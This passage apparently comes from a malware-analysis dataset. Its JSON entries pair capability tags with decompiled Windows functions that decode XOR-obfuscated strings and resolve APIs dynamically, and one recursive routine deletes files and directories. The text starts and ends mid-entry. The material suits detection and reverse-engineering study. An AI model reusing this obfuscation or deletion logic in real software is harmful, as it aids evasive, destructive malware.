0x2b;\n                var_38h._0_2_ = 0x2a1d;\n                var_38h._2_1_ = 0x1d;\n                var_38h._3_1_ = 0x39;\n                var_34h = 0x74;\n                var_2ch = 0x48745772;\n                var_28h._0_2_ = 0x4369;\n                uVar1 = (*pcVar5)(8, 0x16);\n                iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                iVar6 = 0;\n                var_24h = &var_48h - iVar2;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n                    iVar3 = var_8h;\n                    if (iVar4 != 0x7ca30a) {\n                        *(iVar6 + iVar2) = *(&var_2ch + iVar6 % var_18h) ^ (iVar6 + iVar2)[var_24h];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0x15);\n                *0x41cdc0 = fcn.0040dfff(iVar2);\n                if (*0x41cdc0 != 0) {\n                    uVar1 = (*pcVar5)(0, iVar2);\n                    pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                    uVar1 = (*pcVar5)(0, var_10h);\n                    (*pcVar7)(uVar1);\n                    uVar1 = (*pcVar5)(0, var_4h);\n                    (*pcVar7)(uVar1);\n                    uVar1 = (*pcVar5)(0, var_14h);\n                    (*pcVar7)(uVar1);\n                    uVar1 = (*pcVar5)(0, iVar3);\n                    (*pcVar7)(uVar1);\n                    goto code_r0x0040deb0;\n                }\n                uVar1 = (*pcVar5)(0, iVar2);\n                pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar5)(0, var_10h);\n                (*pcVar7)(uVar1);\n                uVar1 = (*pcVar5)(0, var_4h);\n                (*pcVar7)(uVar1);\n                uVar1 = (*pcVar5)(0, var_14h);\n                goto code_r0x0040dc30;\n            }\n            uVar1 = (*pcVar5)(0, var_10h);\n            pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n        }\n        (*pcVar5)(uVar1);\n        pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*pcVar5)(uVar1);\n        uVar1 = (*pcVar7)(0, iVar3);\n        (*pcVar5)(uVar1);\n    }\ncode_r0x0040deb5:\n    *0x41cdbc = *0x41cdb8 >> 0x20;\n    *0x41cdc4 = *0x41cdc0 >> 0x20;\n    *0x41cdb4 = *0x41cdb0 >> 0x20;\n    *0x41cdac = *0x41cda8 >> 0x20;\n    return var_ch;\n}\n",
        "token_count": 2707
    },
    "0040e180": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0040e180(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t lpLibFileName;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_28h = 0x4b1d735f;\n    var_24h = 0x735e7356;\n    var_20h._0_2_ = 0x4b6d;\n    lpLibFileName = 0x4b6d7330;\n    var_10h._0_2_ = 0x7333;\n    var_18h = param_2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_4h = 6;\n    iVar8 = 0;\n    var_ch = &var_28h - iVar3;\n    var_8h = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n        if (iVar4 != 0x5122f) {\n            *(iVar8 + iVar3) = *(&lpLibFileName + iVar8 % var_4h) ^ (iVar8 + iVar3)[var_ch];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 10);\n    var_38h = 0x207c0f31;\n    var_34h = 0x6950583b;\n    var_30h = 0x6b1b005d;\n    var_24h = 0x6c394762;\n    var_20h._0_2_ = 0x6b77;\n    uVar2 = (*pcVar6)(8, 0xd);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_ch = &var_38h - iVar3;\n    lpLibFileName = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        if (iVar4 != 0xe218c4) {\n            *(iVar8 + iVar3) = *(&var_24h + iVar8 % var_4h) ^ (iVar8 + iVar3)[var_ch];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xc);\n    var_38h = 0x41c5b07;\n    var_34h = 0x562c1222;\n    var_30h = 0x323a1d1a;\n    var_2ch._0_2_ = 0x3303;\n    var_24h = 0x68793354;\n    var_20h._0_2_ = 0x574e;\n    uVar2 = (*pcVar6)(8, 0xf);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_ch = &var_38h - iVar3;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_CloseClipboard)();\n        iVar4 = lpLibFileName;\n        if (iVar5 != 0xeb7c0c) {\n            *(iVar8 + iVar3) = *(&var_24h + iVar8 % var_4h) ^ (iVar8 + iVar3)[&var_38h - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xe);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar3);\n    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    uVar7 = (*pcVar6)(0, var_8h, var_1ch, var_18h, 0, 0);\n    if (0x20 < uVar7) {\n        uVar7 = 0;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*pcVar6)(uVar2);\n    uVar2 = (*pcVar1)(0, var_8h);\n    (*pcVar6)(uVar2);\n    return uVar7;\n}\n",
        "token_count": 1191
    },
    "0040edc3": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040edc3(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpModuleName;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0xa15231f;\n    var_20h = 0x1d335f23;\n    var_1ch._0_2_ = 0x4f0a;\n    var_18h = 0x66715771;\n    var_14h._0_2_ = CONCAT11(var_14h._1_1_, 0x4f);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_24h - iVar2;\n    lpModuleName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        if (iVar3 != 0x7b0fea) {\n            var_4h = 5;\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % 5) ^ (iVar7 + iVar2)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_3ch = 0x1e001c65;\n    var_38h = 0x943121e;\n    var_34h = 0x15192518;\n    var_30h = 0x23032c58;\n    var_2ch = 0x745332f;\n    var_28h._0_2_ = 0x501e;\n    var_18h = 0x506c6837;\n    var_14h._0_2_ = 0x416a;\n    uVar1 = (*pcVar5)(8, 0x17);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_3ch - iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n        iVar3 = lpModuleName;\n        if (iVar4 != 0x74b4e9) {\n            var_8h = 6;\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % 6) ^ (iVar7 + iVar2)[&var_3ch - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x16);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar2);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    uVar1 = (*pcVar5)(var_10h);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 895
    },
    "0040eefc": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040eefc(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpModuleName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0xa15231f;\n    var_20h = 0x1d335f23;\n    var_1ch._0_2_ = 0x4f0a;\n    var_18h = 0x66715771;\n    var_14h._0_1_ = 0x4f;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_4h = 5;\n    iVar7 = 0;\n    var_8h = &var_24h - iVar2;\n    lpModuleName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        if (iVar3 != 0x7b0fea) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_24h = 0x3d34301a;\n    var_20h = 0x3720262d;\n    var_1ch._0_2_ = 0x4c02;\n    var_18h = 0x6f584448;\n    var_14h._0_1_ = 0x4c;\n    uVar1 = (*pcVar5)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_24h - iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        iVar3 = lpModuleName;\n        if (iVar4 != 0x19302d) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[&var_24h - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar2);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    uVar1 = (*pcVar5)(var_10h);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 795
    },
    "0040f017": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040f017(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint in_EDX;\n    int32_t iVar7;\n    uint *puVar8;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_10h = 0;\n    puVar8 = &var_28h;\n    for (iVar6 = 8; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_3ch = 0x25243c27;\n    var_38h = 0xc213f34;\n    var_34h = 0x1b0f0b33;\n    var_30h = 0x30270c;\n    var_2ch._0_2_ = 0x727;\n    var_2ch._2_1_ = 0x44;\n    var_20h = 0x44694869;\n    var_1ch._0_1_ = 0x44;\n    var_14h = in_EDX;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_4h = 5;\n    iVar7 = 0;\n    var_8h = &var_3ch - iVar6;\n    var_ch = iVar6;\n    do {\n        iVar2 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        if (iVar2 != 0x66d379) {\n            *(iVar7 + iVar6) = *(&var_20h + iVar7 % var_4h) ^ (iVar7 + iVar6)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x13);\n    var_34h = 0xa15231f;\n    var_30h = 0x1d335f23;\n    var_2ch._0_2_ = 0x4f0a;\n    var_20h = 0x66715771;\n    var_1ch._0_1_ = 0x4f;\n    uVar1 = (*pcVar4)(8, 0xb);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_34h - iVar6;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        iVar2 = var_ch;\n        if (iVar3 != 0x7b0fea) {\n            *(iVar7 + iVar6) = *(&var_20h + iVar7 % var_4h) ^ (iVar7 + iVar6)[&var_34h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar6, var_ch);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    (*pcVar4)(var_18h, var_14h, arg_8h, 0, 0, &var_28h, &var_10h, 2, 0, 0x40);\n    uVar1 = fcn.0040edc3();\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    (*pcVar4)(uVar5);\n    return uVar1;\n}\n",
        "token_count": 1021
    },
    "0040f173": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040f173(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_3ch;\n    uint var_37h;\n    uint var_33h;\n    uint var_2fh;\n    uint var_2bh;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpLibFileName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0xa15231f;\n    var_20h = 0x1d335f23;\n    var_1ch._0_2_ = 0x4f0a;\n    var_18h = 0x66715771;\n    var_14h._0_2_ = CONCAT11(var_14h._1_1_, 0x4f);\n    var_10h = param_2;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_4h = 5;\n    iVar7 = 0;\n    var_8h = &var_24h - iVar2;\n    lpLibFileName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        if (iVar3 != 0x7b0fea) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_3ch._0_1_ = 5;\n    stack0xffffffc1 = 0x2b0339;\n    var_37h = 0x3f1b3b53;\n    var_33h = 0x2d7d1a20;\n    var_2fh = 0x1926331e;\n    var_2bh = 0x5623245b;\n    var_18h = 0x45564d4b;\n    var_14h._0_2_ = 0x326d;\n    uVar1 = (*pcVar5)(8, 0x16);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_3ch - iVar2;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n        iVar3 = lpLibFileName;\n        if (iVar4 != 0xa21236) {\n            var_8h = 6;\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % 6) ^ (iVar7 + iVar2)[&var_3ch - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x15);\n    uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar2);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    (*pcVar5)(0xffffffff, var_10h);\n    uVar1 = fcn.0040edc3();\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 932
    },
    "0040f2b5": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040f2b5(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    uint *in_EDX;\n    int32_t iVar6;\n    uint *puVar7;\n    uchar *puVar8;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    int32_t lpModuleName;\n    int32_t var_10h;\n    uchar *var_ch;\n    int32_t var_8h;\n    \n    var_8h = 0;\n    var_ch = NULL;\n    var_38h = 0xa15231f;\n    puVar7 = &var_54h;\n    var_1ch = in_EDX;\n    for (iVar5 = 0x18; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_34h = 0x1d335f23;\n    puVar7 = &var_2ch;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &var_24h;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_30h = CONCAT22(var_30h._2_2_, 0x4f0a);\n    var_24h = 0x66715771;\n    var_20h._0_1_ = 0x4f;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_10h = 5;\n    iVar6 = 0;\n    lpModuleName = iVar5;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        if (iVar3 != 0x7b0fea) {\n            *(iVar6 + iVar5) = *(&var_24h + iVar6 % var_10h) ^ (iVar6 + iVar5)[&var_38h - iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 10);\n    var_3ch = 0x2a22003b;\n    var_38h = 0x400142f;\n    var_34h = 0x162f0b;\n    var_30h = 0x75243708;\n    var_24h = 0x58617475;\n    var_20h._0_1_ = 0x4a;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar6 = 0;\n    var_18h = &var_3ch - iVar5;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar3 != 0x71b7f9) {\n            *(iVar6 + iVar5) = *(&var_24h + iVar6 % var_10h) ^ (iVar6 + iVar5)[&var_3ch - iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x10);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar5);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    var_48h = 0x40;\n    var_54h = 0x18;\n    var_50h = 0;\n    var_4ch = 0;\n    var_44h = 0;\n    var_40h = 0;\n    iVar6 = (*pcVar4)(&var_8h, 0xf001f, &var_54h, &var_2ch, 0x40, 0x8000000, 0);\n    if (iVar6 < 0) {\n        iVar6 = fcn.0040edc3();\n    }\n    else {\n        iVar6 = fcn.0040f017(&var_ch);\n        puVar8 = var_ch;\n        var_10h = iVar6;\n        if (iVar6 == 0) {\n            for (; var_2ch != 0; var_2ch = var_2ch + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n            *var_1ch = var_ch;\n            if (arg_8h != NULL) {\n                *arg_8h = var_8h;\n            }\n        }\n    }\n    if ((var_8h != 0) && (arg_8h == NULL)) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(var_8h);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, lpModuleName);\n    (*pcVar4)(uVar2);\n    return iVar6;\n}\n",
        "token_count": 1387
    },
    "0040faed": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040faed(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    code *pcVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    uint var_40h;\n    uint var_3bh;\n    uchar var_37h;\n    int32_t var_34h;\n    int32_t hFindFile;\n    uint var_2ch;\n    int32_t var_28h;\n    int16_t *var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t lpString2;\n    int32_t var_ch;\n    uint8_t *lpFindFileData;\n    int32_t lpFileName;\n    \n    iVar7 = 8;\n    var_20h = 0x104;\n    var_34h = fcn.0040f6ae();\n    lpString2 = in_ECX;\n    if (var_34h != 0) {\n        lpString2 = var_34h;\n    }\n    var_18h = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    if (lpFileName != 0) {\n        uVar1 = (*pcVar5)(8, var_18h * 2 + 0xc);\n        var_14h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if (var_14h != 0) {\n            uVar1 = (*pcVar5)(8, 0x250);\n            lpFindFileData = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            if (lpFindFileData != NULL) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpFileName, lpString2);\n                var_ch = 0x696a6d65;\n                hFindFile = 0x696a6d39;\n                var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 0x36);\n                uVar1 = (*pcVar5)(8, 9);\n                iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                iVar4 = 0;\n                var_28h = iVar7;\n                do {\n                    iVar2 = (*_sym.imp.USER32.dll_CreateMenu)();\n                    if (iVar2 != 0x956284) {\n                        var_24h = 0x5;\n                        *(iVar4 + iVar7) = *(&hFindFile + iVar4 % 5) ^ (iVar4 + iVar7)[&var_ch - iVar7];\n                    }\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < 4);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, iVar7);\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(var_14h, lpString2);\n                var_1ch = 6;\n                var_40h._0_1_ = 6;\n                stack0xffffffbd = 0x67371d35;\n                var_3bh = 0x3735706d;\n                var_37h = 0x37;\n                hFindFile = 0x3737355a;\n                var_2ch._0_2_ = 0x6d49;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n                iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                iVar4 = 0;\n                var_24h = &var_40h - iVar7;\n                do {\n                    iVar3 = (*_sym.imp.USER32.dll_GetInputState)();\n                    iVar2 = var_14h;\n                    if (iVar3 != 0xf8383e) {\n                        *(iVar4 + iVar7) = *(&hFindFile + iVar4 % var_1ch) ^ *((&var_40h - iVar7) + iVar4 + iVar7);\n                    }\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < 10);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(var_14h, iVar7);\n                hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar2, lpFindFileData);\n                iVar4 = var_28h;\n                pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (hFindFile == -1) {\n                    var_ch = 3;\n                }\n                else {\n                    var_ch = 0;\n                    var_24h = lpFindFileData + 0x2c;\n                    do {\n                        if (*var_24h != 0x2e) {\n                            iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(var_24h);\n                            var_1ch = iVar2 + 2 + var_18h;\n                            if (var_20h < var_1ch) {\n                                uVar1 = (*pcVar5)(0, lpFileName);\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                                uVar1 = (*pcVar5)(8, var_1ch * 2);\n                                lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                                if (lpFileName == 0) {\n                                    var_ch = 8;\n                                    break;\n                                }\n                                var_20h = var_1ch;\n                                (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpFileName, lpString2);\n                                (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, iVar4);\n                            }\n                            else {\n                                *(lpFileName + 2 + var_18h * 2) = 0;\n                            }\n                            (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, var_24h);\n                            if ((*lpFindFileData & 0x10) == 0) {\n                                iVar2 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(lpFileName);\n                            }\n                            else {\n                                var_ch = fcn.0040faed(arg_8h);\n                                if (var_ch != 0) break;\n                                iVar2 = (*_sym.imp.KERNEL32.dll_RemoveDirectoryW)(lpFileName);\n                            }\n                            if ((iVar2 == 0) && (arg_8h == 0)) {\n                                var_ch = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                                break;\n                            }\n                        }\n                        iVar2 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, lpFindFileData);\n                    } while (iVar2 != 0);\n                }\n                uVar1 = (*pcVar5)(0, iVar7);\n                pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar5)(0, iVar4);\n                (*pcVar6)(uVar1);\n                uVar1 = (*pcVar5)(0, lpFindFileData);\n                (*pcVar6)(uVar1);\n                iVar7 = var_ch;\n            }\n            uVar1 = (*pcVar5)(0, var_14h);\n            (*pcVar6)(uVar1);\n        }\n        if (lpFileName != 0) {\n            uVar1 = (*pcVar5)(0, 